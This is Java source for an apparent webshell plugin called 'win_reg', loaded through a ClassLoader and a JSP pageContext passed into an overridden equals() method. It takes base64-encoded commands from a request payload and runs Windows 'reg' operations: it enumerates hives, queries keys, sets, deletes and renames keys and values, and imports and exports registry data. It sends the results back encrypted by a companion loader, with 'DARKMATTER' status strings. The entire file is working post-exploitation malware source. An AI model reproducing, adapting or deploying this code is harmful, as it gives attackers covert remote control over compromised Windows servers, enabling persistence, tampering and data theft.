import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class win_reg extends ClassLoader
{
    private final Pattern PATH_PATTERN = Pattern.compile(
        "^HKEY_(LOCAL_MACHINE|CURRENT_USER|USERS|CLASSES_ROOT|CURRENT_CONFIG)\\\\[A-Za-z0-9_\\\\-]+$"
    );
    private final Pattern VALUE_NAME_PATTERN = Pattern.compile("^[A-Za-z0-9 _\\-]+$");
    private static final Pattern REG_OUTPUT_PATTERN = Pattern.compile("^\\s*(.*?)\\s{2,}(REG_\\w+)\\s{2,}(.*)$");

    public win_reg(ClassLoader objParent) { super(objParent); }
    public win_reg() { super(win_reg.class.getClassLoader()); }

    private Map<String, String> fnParseParams(String szParamStr)
    {
        Map<String, String> mapParams = new HashMap<String, String>();
        if (szParamStr == null || szParamStr.trim().isEmpty())
            return mapParams;

        String[] aszPairs = szParamStr.split("&");
        for (String szPair : aszPairs)
        {
            int nIdx = szPair.indexOf("=");
            if (nIdx > 0)
            {
                mapParams.put(szPair.substring(0, nIdx), szPair.substring(nIdx + 1));
            }
        }
        return mapParams;
    }

    private void fnWriteOutput(Object objParam, Object objResponse, OutputStream osClient, byte[] abResult)
    {
        if (abResult.length == 0)
            abResult = "DARKMATTER_SUCCESS: Action executed but returned no output".getBytes();

        Object objPageContext = objParam;

        try
        {
            byte[] abEncryptedResult = Encrypt(objParam, abResult);
            osClient.write(abEncryptedResult);
            osClient.flush();

            Method fnSetStatus = objResponse.getClass().getMethod("setStatus", new Class[]{int.class});
            fnSetStatus.invoke(objResponse, new Object[]{200});

            try
            {
                Method fnGetOut = objPageContext.getClass().getMethod("getOut", new Class[0]);
                Object objOut = fnGetOut.invoke(objPageContext, new Object[0]);
                Method fnClear = objOut.getClass().getMethod("clear", new Class[0]);
                fnClear.invoke(objOut, new Object[0]);
            }
            catch (Exception exIgnored) {}

            Method fnFlushBuffer = objResponse.getClass().getMethod("flushBuffer", new Class[0]);
            fnFlushBuffer.invoke(objResponse, new Object[0]);
        }
        catch (Exception exIgnored)
        {

        }
    }

    private byte[] Encrypt(Object objPageContext, byte[] abRawResponse)
    {
        try
        {
            if (objPageContext == null)
                return abRawResponse;

            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            Object objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPulsarLoader = fnGetAttribute.invoke(objRequest, new Object[]{"pulsar_loader_instance"});
            
            if (objPulsarLoader == null)
                return abRawResponse;

            java.lang.reflect.Method fnCrypt = objPulsarLoader.getClass().getDeclaredMethod("Crypt", byte[].class, int.class);
            fnCrypt.setAccessible(true);

            return (byte[])fnCrypt.invoke(objPulsarLoader, abRawResponse, 1);
        }
        catch (Exception exCrashed)
        {
            return abRawResponse;
        }
    }

    @Override
    public boolean equals(Object objParam)
    {
        Object objPageContext = objParam;
        Object objRequest = null;
        Object objResponse = null;
        OutputStream osClient = null;

        try
        {
            Method fnGetRequest = objPageContext.getClass().getMethod("getRequest", new Class[0]);
            objRequest = fnGetRequest.invoke(objPageContext, new Object[0]);

            Method fnGetResponse = objPageContext.getClass().getMethod("getResponse", new Class[0]);
            objResponse = fnGetResponse.invoke(objPageContext, new Object[0]);

            Method fnGetOutputStream = objResponse.getClass().getMethod("getOutputStream", new Class[0]);
            osClient = (OutputStream) fnGetOutputStream.invoke(objResponse, new Object[0]);

            Method fnGetAttribute = objRequest.getClass().getMethod("getAttribute", new Class[]{String.class});
            Object objPayload = fnGetAttribute.invoke(objRequest, new Object[]{"payload"});
            Object objLength = fnGetAttribute.invoke(objRequest, new Object[]{"len"});

            if (objPayload == null || objLength == null)
            {
                osClient.write("PAYLOAD_ERROR: Missing attributes from request.".getBytes());
                return true;
            }

            byte[] abPayload = (byte[])objPayload;
            int nClassLength = Integer.parseInt(objLength.toString());
            int nParamOffset = nClassLength + 4;
            int nParamLength = abPayload.length - nParamOffset;
            String szParam = new String(abPayload, nParamOffset, nParamLength, "UTF-8").trim();

            Map<String, String> mapParams = fnParseParams(szParam);
            String szSplitter = mapParams.get("splitter");
            StringBuilder sb = new StringBuilder();

            String szAction = new String(Base64.getDecoder().decode(mapParams.get("z0")), StandardCharsets.UTF_8);
            String szJson = "";

            String[] hives = {
                "HKEY_CLASSES_ROOT",
                "HKEY_CURRENT_USER",
                "HKEY_LOCAL_MACHINE",
                "HKEY_USERS",
                "HKEY_CURRENT_CONFIG"
            };

            switch (szAction)
            {
                case "hive":
                    szJson = fnJsonEncodeMap(fnScanHives(hives));
                    break;

                case "scan":
                    szJson = fnJsonEncodeMap(fnScanRegistry(fnDecodeString(mapParams.get("z2"))));
                    break;

                case "set":
                case "new_value":
                    szJson = fnJsonEncodeMap(fnSetValue(
                        fnDecodeString(mapParams.get("z2")),
                        fnDecodeString(mapParams.get("z3")),
                        fnDecodeString(mapParams.get("z4")),
                        fnDecodeString(mapParams.get("z5"))
                    ));
                    break;

                case "del_key":
                    szJson = fnJsonEncodeMap(fnDeleteKey(fnDecodeString(mapParams.get("z2"))));
                    break;

                case "del_value":
                    szJson = fnJsonEncodeMap(fnDeleteValue(
                        fnDecodeString(mapParams.get("z2")),
                        fnDecodeString(mapParams.get("z3"))
                    ));
                    break;

                case "rename_key":
                    szJson = fnJsonEncodeMap(fnRenameKey(
                        fnDecodeString(mapParams.get("z2")),
                        fnDecodeString(mapParams.get("z3"))
                    ));
                    break;

                case "rename_value":
                    szJson = fnJsonEncodeMap(fnRenameValue(
                        fnDecodeString(mapParams.get("z2")),
                        fnDecodeString(mapParams.get("z3")),
                        fnDecodeString(mapParams.get("z4"))
                    ));
                    break;

                case "new_key":
                    szJson = fnJsonEncodeMap(fnCreateKey(fnDecodeString(mapParams.get("z2"))));
                    break;

                case "export":
                    szJson = fnJsonEncodeMap(fnExportKey(fnDecodeString(mapParams.get("z2"))));
                    break;

                case "import":
                    szJson = fnJsonEncodeMap(fnImport(fnDecodeString(mapParams.get("z2"))));
                    break;

                default:
                    szJson = "{\"success\":false,\"error\":\"Unknown action\",\"subkeys\":[],\"values\":[]}";
                    break;
            }

            sb.append(szJson);

            fnWriteOutput(objParam, objResponse, osClient, sb.toString().getBytes());
        }
        catch (Exception ex)
        {
            if (osClient != null)
            {
                try
                {
                    StringWriter swTrace = new StringWriter();
                    ex.printStackTrace(new PrintWriter(swTrace));

                    osClient.write(("DARKMATTER_INTERNAL_CRASHED: " + swTrace.toString()).getBytes());
                }
                catch (Exception exIgnored) {}
            }
        }

        return true;
    }

    private static int fnRunReg(String[] cmdArgs, List<String> output) {
        try {
            ProcessBuilder pb = new ProcessBuilder(cmdArgs);
            pb.redirectErrorStream(true);
            Process p = pb.start();
            
            String osEncoding = System.getProperty("sun.stdout.encoding");
            if (osEncoding == null) {
                osEncoding = System.getProperty("file.encoding", "Big5");
            }

            try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), osEncoding))) {
                String line;
                while ((line = r.readLine()) != null) {
                    output.add(line);
                }
            }
            return p.waitFor();
        } catch (Exception e) {
            output.add("ERROR: " + e.getMessage());
            return -1;
        }
    }

    private boolean fnValidatePath(String path) {
        return PATH_PATTERN.matcher(path).matches();
    }

    private boolean fnValidateValueName(String name) {
        return VALUE_NAME_PATTERN.matcher(name).matches();
    }

    private byte[] fnRegistryValueToBytes(String value, String type) {
        try {
            switch (type) {
                case "REG_DWORD":
                    int dwordNum = (int) Long.parseLong(value.replaceFirst("(?i)^0x", ""), 16);
                    return ByteBuffer.allocate(4).order(ByteOrder.LITTLE_ENDIAN).putInt(dwordNum).array();

                case "REG_QWORD":
                    long qwordNum = new BigInteger(value.replaceFirst("(?i)^0x", ""), 16).longValue();
                    return ByteBuffer.allocate(8).order(ByteOrder.LITTLE_ENDIAN).putLong(qwordNum).array();

                case "REG_BINARY":
                    String hex = value.replaceAll("[^A-Fa-f0-9]", "");
                    byte[] rawBytes = new byte[hex.length() / 2];
                    for (int i = 0; i < rawBytes.length; i++) {
                        rawBytes[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
                    }
                    return rawBytes;

                case "REG_SZ":
                case "REG_EXPAND_SZ":
                case "REG_MULTI_SZ":
                default:
                    return value.getBytes(StandardCharsets.UTF_8);
            }
        } catch (Exception e) {
            return new byte[0];
        }
    }

    private Map<String, Object> fnScanRegistry(String basePath) {
        Map<String, Object> result = new LinkedHashMap<>();
        List<String> output = new ArrayList<>();
        int ret = fnRunReg(new String[]{"reg", "query", basePath}, output);

        result.put("success", ret == 0);
        result.put("error", ret != 0 ? String.join("\n", output) : null);
        List<String> subkeys = new ArrayList<>();
        List<Map<String, Object>> values = new ArrayList<>();

        if (ret == 0) {
            boolean firstKeySeen = false;
            for (String line : output) {
                line = line.trim();
                if (line.isEmpty()) continue;

                if (line.startsWith("HKEY_")) {
                    if (!firstKeySeen) {
                        firstKeySeen = true;
                    } else {
                        subkeys.add(line);
                    }
                    continue;
                }

                Matcher m = REG_OUTPUT_PATTERN.matcher(line);
                if (m.matches()) {
                    String name = m.group(1).trim();
                    String type = m.group(2).trim();
                    String valData = m.group(3).trim();

                    byte[] bytes = fnRegistryValueToBytes(valData, type);

                    Map<String, Object> valMap = new LinkedHashMap<>();
                    valMap.put("name", name.isEmpty() ? "(Default)" : name);
                    valMap.put("type", type);
                    valMap.put("data", Base64.getEncoder().encodeToString(bytes));
                    values.add(valMap);
                }
            }
        }
        result.put("subkeys", subkeys);
        result.put("values", values);
        return result;
    }

    private Map<String, Object> fnScanHives(String[] hives) {
        Map<String, Object> result = new LinkedHashMap<>();
        for (String hive : hives) {
            List<String> output = new ArrayList<>();
            int ret = fnRunReg(new String[]{"reg", "query", hive}, output);
            result.put(hive, ret == 0);
        }
        return result;
    }

    private Map<String, Object> fnSetValue(String path, String name, String type, String data) {
        Map<String, Object> result = new LinkedHashMap<>();
        List<String> allowedTypes = Arrays.asList("REG_SZ", "REG_EXPAND_SZ", "REG_DWORD", "REG_QWORD", "REG_BINARY", "REG_MULTI_SZ");

        if (!allowedTypes.contains(type)) {
            result.put("success", false);
            result.put("error", "Invalid type");
            return result;
        }
        if (!fnValidatePath(path) || !fnValidateValueName(name)) {
            result.put("success", false);
            result.put("error", "Invalid path or name");
            return result;
        }

        String formattedData = data;
        if ("REG_BINARY".equals(type)) {
            byte[] decoded = Base64.getDecoder().decode(data);
            StringBuilder sb = new StringBuilder();
            for (byte b : decoded) sb.append(String.format("%02X", b));
            formattedData = sb.toString();
        } else if ("REG_MULTI_SZ".equals(type)) {
            formattedData = data.replace(",", "\\0"); 
        }

        List<String> out = new ArrayList<>();
        fnRunReg(new String[]{"reg", "add", path, "/v", name, "/t", type, "/d", formattedData, "/f"}, out);
        
        String joinedOut = String.join("\n", out);
        boolean ok = !joinedOut.contains("ERROR");

        result.put("success", ok);
        result.put("output", out);
        return result;
    }

    private Map<String, Object> fnDeleteKey(String path)
    {
        Map<String, Object> result = new LinkedHashMap<>();
        if (!fnValidatePath(path))
        {
            result.put("success", false);
            result.put("error", "Invalid path");
            return result;
        }

        List<String> out = new ArrayList<>();
        int ret = fnRunReg(new String[]{"reg", "delete", path, "/f"}, out);
        result.put("success", ret == 0);
        result.put("output", out);

        return result;
    }

    private Map<String, Object> fnDeleteValue(String path, String name)
    {
        Map<String, Object> result = new LinkedHashMap<>();
        if (!fnValidatePath(path) || !fnValidateValueName(name))
        {
            result.put("success", false);
            result.put("error", "Invalid input");
            return result;
        }

        List<String> out = new ArrayList<>();
        fnRunReg(new String[]{"reg", "delete", path, "/v", name, "/f"}, out);
        result.put("success", true);
        result.put("output", out);

        return result;
    }

    @SuppressWarnings("unchecked")
    private Map<String, Object> fnRenameValue(String path, String oldName, String newName)
    {
        Map<String, Object> result = new LinkedHashMap<>();
        if (!fnValidatePath(path) || !fnValidateValueName(oldName) || !fnValidateValueName(newName))
        {
            result.put("success", false);
            result.put("error", "Invalid input");

            return result;
        }

        Map<String, Object> scan = fnScanRegistry(path);
        List<Map<String, Object>> values = (List<Map<String, Object>>) scan.get("values");
        Map<String, Object> targetValue = null;

        for (Map<String, Object> v : values)
        {
            if (oldName.equals(v.get("name")))
            {
                targetValue = v;
                break;
            }
        }

        if (targetValue == null)
        {
            result.put("success", false);
            result.put("error", "Value not found");

            return result;
        }

        String decodedData = new String(Base64.getDecoder().decode((String) targetValue.get("data")), StandardCharsets.UTF_8).replace("\0", "");
        Map<String, Object> setRes = fnSetValue(path, newName, (String) targetValue.get("type"), decodedData);

        if (!(boolean) setRes.get("success"))
        {
            return setRes;
        }

        return fnDeleteValue(path, oldName);
    }

    private Map<String, Object> fnRenameKey(String oldPath, String newPath)
    {
        Map<String, Object> result = new LinkedHashMap<>();
        if (!fnValidatePath(oldPath))
        {
            result.put("success", false);
            result.put("error", "Invalid source path");

            return result;
        }

        List<String> out = new ArrayList<>();
        fnRunReg(new String[]{"reg", "copy", oldPath, newPath, "/s", "/f"}, out);
        boolean ok = !String.join("\n", out).contains("ERROR");

        if (!ok)
        {
            result.put("success", false);
            result.put("output", out);
            return result;
        }

        List<String> out2 = new ArrayList<>();
        fnRunReg(new String[]{"reg", "delete", oldPath, "/f"}, out2);

        result.put("success", true);
        out.addAll(out2);
        result.put("output", out);

        return result;
    }

    private Map<String, Object> fnCreateKey(String path)
    {
        Map<String, Object> result = new LinkedHashMap<>();
        if (!fnValidatePath(path)) {
            result.put("success", false);
            result.put("error", "Invalid path");
            return result;
        }
        List<String> out = new ArrayList<>();
        int ret = fnRunReg(new String[]{"reg", "add", path, "/f"}, out);
        result.put("success", ret == 0);
        result.put("output", out);
        return result;
    }

    private Map<String, Object> fnExportKey(String path)
    {
        Map<String, Object> result = new LinkedHashMap<>();
        if (!fnValidatePath(path))
        {
            result.put("success", false);
            result.put("error", "Invalid path");
            return result;
        }

        try 
        {
            File tempFile = File.createTempFile("reg_", ".reg");
            tempFile.deleteOnExit();

            List<String> out = new ArrayList<>();
            int ret = fnRunReg(new String[]{"reg", "export", path, tempFile.getAbsolutePath(), "/y"}, out);

            if (ret != 0 || !tempFile.exists()) {
                result.put("success", false);
                result.put("output", out);
                return result;
            }

            byte[] content = java.nio.file.Files.readAllBytes(tempFile.toPath());
            tempFile.delete();

            result.put("success", true);
            result.put("data", Base64.getEncoder().encodeToString(content));
        }
        catch (Exception e)
        {
            result.put("success", false);
            result.put("error", e.getMessage());
        }
        
        return result;
    }

    private Map<String, Object> fnImport(String content)
    {
        Map<String, Object> result = new LinkedHashMap<>();
        try {
            File tempFile = File.createTempFile("reg_", ".reg");
            tempFile.deleteOnExit();
            
            java.nio.file.Files.write(tempFile.toPath(), content.getBytes(StandardCharsets.UTF_8));

            List<String> out = new ArrayList<>();
            int ret = fnRunReg(new String[]{"reg", "import", tempFile.getAbsolutePath()}, out);
            tempFile.delete();

            result.put("success", ret == 0);
            result.put("output", out);
        }
        catch (Exception e)
        {
            result.put("success", false);
            result.put("error", e.getMessage());
        }

        return result;
    }

    private String fnDecodeString(String src)
    {
        if (src == null || src.isEmpty()) return "";
        try { return new String(Base64.getDecoder().decode(src.trim()), StandardCharsets.UTF_8); } 
        catch (Exception e) { return ""; }
    }

    @SuppressWarnings("unchecked")
    private String fnJsonEncodeMap(Map<String, Object> map)
    {
        StringBuilder sb = new StringBuilder();
        sb.append("{");
        boolean first = true;
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            if (!first) sb.append(",");
            first = false;
            sb.append("\"").append(entry.getKey()).append("\":");
            Object val = entry.getValue();
            if (val instanceof String) {
                sb.append("\"").append(val.toString().replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")).append("\"");
            } else if (val instanceof Boolean || val instanceof Number) {
                sb.append(val);
            } else if (val instanceof List) {
                sb.append("[");
                List<Object> list = (List<Object>) val;
                for (int i = 0; i < list.size(); i++) {
                    if (i > 0) sb.append(",");
                    if (list.get(i) instanceof Map) {
                        sb.append(fnJsonEncodeMap((Map<String, Object>) list.get(i)));
                    } else {
                        sb.append("\"").append(list.get(i).toString().replace("\\", "\\\\").replace("\"", "\\\"")).append("\"");
                    }
                }
                sb.append("]");
            } else if (val == null) {
                sb.append("null");
            }
        }
        sb.append("}");
        return sb.toString();
    }
}